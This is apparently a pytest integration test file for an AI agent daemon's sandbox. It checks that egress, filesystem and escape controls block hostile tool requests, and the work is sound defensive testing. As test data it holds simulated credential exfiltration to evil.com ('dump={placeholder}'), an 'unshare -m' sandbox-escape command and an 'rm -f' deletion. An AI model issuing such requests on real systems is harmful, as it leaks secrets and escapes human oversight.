"""M3.T1-T12 integration coverage for sandbox/executor runtime."""

from __future__ import annotations

import asyncio
import sys
from contextlib import suppress
from pathlib import Path
from typing import Any

import pytest

from shisad.core.api.transport import ControlClient
from shisad.core.config import DaemonConfig
from shisad.core.types import CredentialRef
from shisad.daemon.runner import run_daemon
from shisad.executors.proxy import EgressProxy, NetworkPolicy
from shisad.security.credentials import CredentialConfig, InMemoryCredentialStore


async def _wait_for_socket(path: Path, timeout: float = 2.0) -> None:
    end = asyncio.get_running_loop().time() + timeout
    while asyncio.get_running_loop().time() < end:
        if path.exists():
            return
        await asyncio.sleep(0.01)
    raise TimeoutError(f"Timed out waiting for socket {path}")


@pytest.fixture
def model_env(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("SHISAD_MODEL_BASE_URL", "https://api.example.com/v1")
    monkeypatch.setenv("SHISAD_MODEL_PLANNER_BASE_URL", "https://planner.example.com/v1")
    monkeypatch.setenv("SHISAD_MODEL_EMBEDDINGS_BASE_URL", "https://embed.example.com/v1")
    monkeypatch.setenv("SHISAD_MODEL_MONITOR_BASE_URL", "https://monitor.example.com/v1")


async def _start_daemon(tmp_path: Path) -> tuple[asyncio.Task[None], ControlClient, DaemonConfig]:
    config = DaemonConfig(
        data_dir=tmp_path / "data",
        socket_path=tmp_path / "control.sock",
        policy_path=tmp_path / "policy.yaml",
        log_level="INFO",
    )
    daemon_task = asyncio.create_task(run_daemon(config))
    client = ControlClient(config.socket_path)
    await _wait_for_socket(config.socket_path)
    await client.connect()
    return daemon_task, client, config


async def _shutdown(daemon_task: asyncio.Task[None], client: ControlClient) -> None:
    with suppress(Exception):
        await client.call("daemon.shutdown")
    await client.close()
    await asyncio.wait_for(daemon_task, timeout=3)


async def _confirm_tool_execute(
    client: ControlClient,
    result: dict[str, Any],
    *,
    reason: str = "approved for test",
) -> dict[str, Any]:
    assert result.get("confirmation_required") is True
    confirmation_id = str(result.get("confirmation_id", ""))
    decision_nonce = str(result.get("decision_nonce", "")).strip()
    assert confirmation_id
    assert decision_nonce
    return await client.call(
        "action.confirm",
        {
            "confirmation_id": confirmation_id,
            "decision_nonce": decision_nonce,
            "reason": reason,
        },
    )


@pytest.mark.asyncio
async def test_m3_t1_blocks_non_allowlisted_domain(model_env: None, tmp_path: Path) -> None:
    daemon_task, client, _ = await _start_daemon(tmp_path)
    try:
        created = await client.call("session.create", {"channel": "cli"})
        sid = created["session_id"]
        result = await client.call(
            "tool.execute",
            {
                "session_id": sid,
                "tool_name": "http_request",
                "command": [sys.executable, "-c", "print('ok')"],
                "network_urls": ["https://evil.com/collect"],
                "security_critical": False,
                "degraded_mode": "fail_open",
                "network": {
                    "allow_network": True,
                    "allowed_domains": ["api.good.com"],
                    "deny_private_ranges": True,
                    "deny_ip_literals": True,
                },
            },
        )
        assert result["allowed"] is False
        assert result.get("confirmation_required") is True
        confirmation_id = str(result.get("confirmation_id", ""))
        assert confirmation_id
        _ = await _confirm_tool_execute(client, result)
        rejected = await client.call(
            "audit.query",
            {"event_type": "ToolRejected", "session_id": sid, "limit": 50},
        )
        reasons = [
            str(item.get("data", {}).get("reason", ""))
            for item in rejected["events"]
            if str(item.get("data", {}).get("actor", "")) == "tool_runtime"
        ]
        assert "network:host_not_allowlisted" in reasons
    finally:
        await _shutdown(daemon_task, client)


@pytest.mark.asyncio
async def test_m3_rr2_empty_command_rejected_as_invalid_params(
    model_env: None,
    tmp_path: Path,
) -> None:
    daemon_task, client, _ = await _start_daemon(tmp_path)
    try:
        created = await client.call("session.create", {"channel": "cli"})
        sid = created["session_id"]
        with pytest.raises(RuntimeError, match=r"RPC error -32602"):
            await client.call(
                "tool.execute",
                {
                    "session_id": sid,
                    "tool_name": "shell_exec",
                    "command": [],
                },
            )
    finally:
        await _shutdown(daemon_task, client)


@pytest.mark.asyncio
async def test_m3_t2_t3_filesystem_mount_and_denylist_enforced(
    model_env: None,
    tmp_path: Path,
) -> None:
    daemon_task, client, _ = await _start_daemon(tmp_path)
    try:
        workspace = tmp_path / "workspace"
        workspace.mkdir(parents=True, exist_ok=True)
        outside = tmp_path / "outside.txt"
        outside.write_text("outside", encoding="utf-8")
        denied = workspace / "denied.tmp"
        denied.write_text("secret", encoding="utf-8")

        created = await client.call("session.create", {"channel": "cli"})
        sid = created["session_id"]
        outside_result = await client.call(
            "tool.execute",
            {
                "session_id": sid,
                "tool_name": "file.read",
                "command": [sys.executable, "-c", "print('noop')"],
                "read_paths": [str(outside)],
                "security_critical": False,
                "degraded_mode": "fail_open",
                "filesystem": {"mounts": [{"path": f"{workspace.as_posix()}/**", "mode": "ro"}]},
            },
        )
        assert outside_result["allowed"] is False
        assert outside_result["reason"] == "filesystem:outside_mounts"

        deny_result = await client.call(
            "tool.execute",
            {
                "session_id": sid,
                "tool_name": "file.read",
                "command": [sys.executable, "-c", "print('noop')"],
                "read_paths": [str(denied)],
                "security_critical": False,
                "degraded_mode": "fail_open",
                    "filesystem": {
                        "mounts": [{"path": f"{workspace.as_posix()}/**", "mode": "ro"}],
                        "denylist": ["**/*.tmp"],
                    },
                },
            )
        assert deny_result["allowed"] is False
        assert deny_result["reason"] == "filesystem:denylist_match"
    finally:
        await _shutdown(daemon_task, client)


@pytest.mark.asyncio
async def test_m3_t4_timeout_and_t5_output_truncation(model_env: None, tmp_path: Path) -> None:
    daemon_task, client, _ = await _start_daemon(tmp_path)
    try:
        created = await client.call("session.create", {"channel": "cli"})
        sid = created["session_id"]
        timeout_result = await client.call(
            "tool.execute",
            {
                "session_id": sid,
                "tool_name": "shell.exec",
                "command": [sys.executable, "-c", "import time; time.sleep(2)"],
                "limits": {"timeout_seconds": 1, "output_bytes": 2048},
                "degraded_mode": "fail_open",
                "security_critical": False,
            },
        )
        assert timeout_result["allowed"] is False
        timeout_confirm = await _confirm_tool_execute(client, timeout_result)
        assert timeout_confirm["confirmed"] is False

        truncation_result = await client.call(
            "tool.execute",
            {
                "session_id": sid,
                "tool_name": "shell.exec",
                "command": [sys.executable, "-c", "print('x' * 7000)"],
                "limits": {"timeout_seconds": 5, "output_bytes": 128},
                "degraded_mode": "fail_open",
                "security_critical": False,
            },
        )
        assert truncation_result["allowed"] is False
        truncation_confirm = await _confirm_tool_execute(client, truncation_result)
        assert truncation_confirm["confirmed"] is True

        executed = await client.call(
            "audit.query",
            {"event_type": "ToolExecuted", "session_id": sid, "limit": 20},
        )
        shell_exec_events = [
            event
            for event in executed["events"]
            if str(event.get("data", {}).get("tool_name", "")).startswith("shell")
            and str(event.get("data", {}).get("actor", "")) == "sandbox"
        ]
        assert any(
            bool(event.get("data", {}).get("success")) is False
            for event in shell_exec_events
        )
        assert any(
            bool(event.get("data", {}).get("success")) is True
            for event in shell_exec_events
        )
    finally:
        await _shutdown(daemon_task, client)


@pytest.mark.asyncio
async def test_m3_t6_checkpoint_before_destructive_and_t7_rollback_restores_session(
    model_env: None,
    tmp_path: Path,
) -> None:
    (tmp_path / "policy.yaml").write_text(
        "\n".join(
            [
                'version: "1"',
                "default_deny: true",
                "default_require_confirmation: false",
                "default_capabilities:",
                "  - file.read",
                "  - file.write",
            ]
        )
        + "\n",
        encoding="utf-8",
    )
    daemon_task, client, _ = await _start_daemon(tmp_path)
    try:
        target = tmp_path / "danger.txt"
        target.write_text("danger", encoding="utf-8")
        created = await client.call("session.create", {"channel": "cli"})
        sid = created["session_id"]

        destructive = await client.call(
            "tool.execute",
            {
                "session_id": sid,
                "tool_name": "file.write",
                "command": ["rm", "-f", str(target)],
                "write_paths": [str(target)],
                "filesystem": {"mounts": [{"path": f"{tmp_path.as_posix()}/**", "mode": "rw"}]},
                "degraded_mode": "fail_open",
                "security_critical": False,
            },
        )
        assert destructive.get("confirmation_required") is True
        confirmation_id = str(destructive.get("confirmation_id", ""))
        assert confirmation_id
        confirmed = await _confirm_tool_execute(client, destructive)
        assert confirmed["confirmed"] is True
        checkpoint_id = str(confirmed["checkpoint_id"])
        assert checkpoint_id
        assert target.exists() is False

        await client.call(
            "session.grant_capabilities",
            {
                "session_id": sid,
                "capabilities": ["http.request"],
                "reason": "test mutation",
            },
        )
        listed_after_grant = await client.call("session.list")
        session_after_grant = next(
            item for item in listed_after_grant["sessions"] if item["id"] == sid
        )
        assert "http.request" in session_after_grant["capabilities"]

        rollback = await client.call("session.rollback", {"checkpoint_id": checkpoint_id})
        assert rollback["rolled_back"] is True
        assert rollback["files_restored"] >= 1

        listed_after_rollback = await client.call("session.list")
        session_after_rollback = next(
            item for item in listed_after_rollback["sessions"] if item["id"] == sid
        )
        assert "http.request" not in session_after_rollback["capabilities"]
        assert target.exists() is True
        assert target.read_text(encoding="utf-8") == "danger"
    finally:
        await _shutdown(daemon_task, client)


@pytest.mark.asyncio
async def test_m3_t8_escape_signal_triggers_lockdown(model_env: None, tmp_path: Path) -> None:
    daemon_task, client, _ = await _start_daemon(tmp_path)
    try:
        created = await client.call("session.create", {"channel": "cli"})
        sid = created["session_id"]
        result = await client.call(
            "tool.execute",
            {
                "session_id": sid,
                "tool_name": "shell.exec",
                "command": ["unshare", "-m"],
                "degraded_mode": "fail_open",
                "security_critical": False,
            },
        )
        assert result["allowed"] is False
        confirmed = await _confirm_tool_execute(client, result)
        assert confirmed["confirmed"] is False

        escape_events = await client.call(
            "audit.query",
            {"event_type": "SandboxEscapeDetected", "session_id": sid, "limit": 10},
        )
        assert escape_events["total"] >= 1
        rejected = await client.call(
            "audit.query",
            {"event_type": "ToolRejected", "session_id": sid, "limit": 20},
        )
        reasons = [
            str(item.get("data", {}).get("reason", ""))
            for item in rejected["events"]
            if str(item.get("data", {}).get("actor", "")) in {"sandbox", "tool_runtime"}
        ]
        assert any(reason.startswith("escape_signal:") for reason in reasons)
        lockdown_events = await client.call(
            "audit.query",
            {"event_type": "LockdownChanged", "session_id": sid, "limit": 10},
        )
        assert lockdown_events["total"] >= 1
    finally:
        await _shutdown(daemon_task, client)


@pytest.mark.asyncio
async def test_m3_t9_browser_paste_runs_output_firewall(model_env: None, tmp_path: Path) -> None:
    daemon_task, client, _ = await _start_daemon(tmp_path)
    try:
        created = await client.call("session.create", {"channel": "cli"})
        sid = created["session_id"]
        blocked = await client.call(
            "browser.paste",
            {"session_id": sid, "text": "open https://evil.com/pixel"},
        )
        assert blocked["allowed"] is False
        assert blocked["blocked"] is True
        assert "malicious_url" in blocked["reason_codes"]
    finally:
        await _shutdown(daemon_task, client)


@pytest.mark.asyncio
async def test_m3_rr2_planner_shell_exec_stage1_requires_upgrade(
    model_env: None,
    tmp_path: Path,
) -> None:
    daemon_task, client, _ = await _start_daemon(tmp_path)
    try:
        created = await client.call(
            "session.create",
            {"channel": "cli", "user_id": "alice", "workspace_id": "ws1"},
        )
        sid = created["session_id"]
        await client.call(
            "session.grant_capabilities",
            {
                "session_id": sid,
                "capabilities": ["shell.exec"],
                "reason": "planner sandbox runtime test",
            },
        )
        reply = await client.call(
            "session.message",
            {
                "session_id": sid,
                "channel": "cli",
                "user_id": "alice",
                "workspace_id": "ws1",
                "content": (
                    "write a command result and run: "
                    "python -c \"print('planner-sandbox-ok')\""
                ),
            },
        )
        pending_ids = list(reply.get("pending_confirmation_ids", []))
        assert pending_ids == []
        assert str(reply.get("response", "")).strip()
        assert reply.get("lockdown_level") == "normal"

        rejected = await client.call(
            "audit.query",
            {"event_type": "ToolRejected", "session_id": sid, "limit": 20},
        )
        stage2_reasons = [
            str(event.get("data", {}).get("reason", ""))
            for event in rejected["events"]
            if str(event.get("data", {}).get("tool_name", "")) == "shell.exec"
        ]
        assert any("trace:stage2_upgrade_required" in reason for reason in stage2_reasons)
        lockdown_events = await client.call(
            "audit.query",
            {"event_type": "LockdownChanged", "session_id": sid, "limit": 10},
        )
        assert lockdown_events["total"] == 0

        executed = await client.call(
            "audit.query",
            {"event_type": "ToolExecuted", "session_id": sid, "limit": 20},
        )
        matching = [
            event
            for event in executed["events"]
            if event["data"].get("tool_name") == "shell.exec"
        ]
        assert not matching
    finally:
        await _shutdown(daemon_task, client)


@pytest.mark.asyncio
async def test_m3_rt5_security_critical_fail_closed_path(model_env: None, tmp_path: Path) -> None:
    daemon_task, client, _ = await _start_daemon(tmp_path)
    try:
        created = await client.call("session.create", {"channel": "cli"})
        sid = created["session_id"]
        result = await client.call(
            "tool.execute",
            {
                "session_id": sid,
                "tool_name": "shell.exec",
                "command": [sys.executable, "-c", "print('ok')"],
                "sandbox_type": "vm",
                "security_critical": True,
                "degraded_mode": "fail_closed",
            },
        )
        assert result["allowed"] is False
        confirmed = await _confirm_tool_execute(client, result)
        assert confirmed["confirmed"] is False

        rejected = await client.call(
            "audit.query",
            {"event_type": "ToolRejected", "session_id": sid, "limit": 20},
        )
        reasons = [
            str(item.get("data", {}).get("reason", ""))
            for item in rejected["events"]
            if str(item.get("data", {}).get("actor", "")) == "tool_runtime"
        ]
        assert "degraded_enforcement" in reasons
    finally:
        await _shutdown(daemon_task, client)


def test_m3_t10_t11_t12_proxy_injection_and_placeholder_exfiltration() -> None:
    store = InMemoryCredentialStore()
    store.register(
        CredentialRef("gmail_primary"),
        "real-secret-value",
        CredentialConfig(allowed_hosts=["api.good.com"]),
    )
    placeholder = store.get_placeholder(CredentialRef("gmail_primary"))
    proxy = EgressProxy(credential_store=store, resolver=lambda _host: ["93.184.216.34"])

    allowed = proxy.authorize_request(
        tool_name="http_request",
        url="https://api.good.com/send",
        headers={"Authorization": placeholder},
        policy=NetworkPolicy(allow_network=True, allowed_domains=["api.good.com"]),
        approved_by_pep=True,
    )
    assert allowed.allowed is True
    assert allowed.injected_headers["Authorization"] == "real-secret-value"

    blocked_host = proxy.authorize_request(
        tool_name="http_request",
        url="https://evil.com/send",
        headers={"Authorization": placeholder},
        policy=NetworkPolicy(allow_network=True, allowed_domains=["evil.com"]),
        approved_by_pep=True,
    )
    assert blocked_host.allowed is False
    assert blocked_host.reason == "credential_host_mismatch"

    blocked_exfil = proxy.authorize_request(
        tool_name="http_request",
        url="https://evil.com/collect",
        body=f"dump={placeholder}",
        policy=NetworkPolicy(allow_network=True, allowed_domains=["evil.com"]),
        approved_by_pep=True,
    )
    assert blocked_exfil.allowed is False
    assert blocked_exfil.reason == "placeholder_exfiltration_blocked"
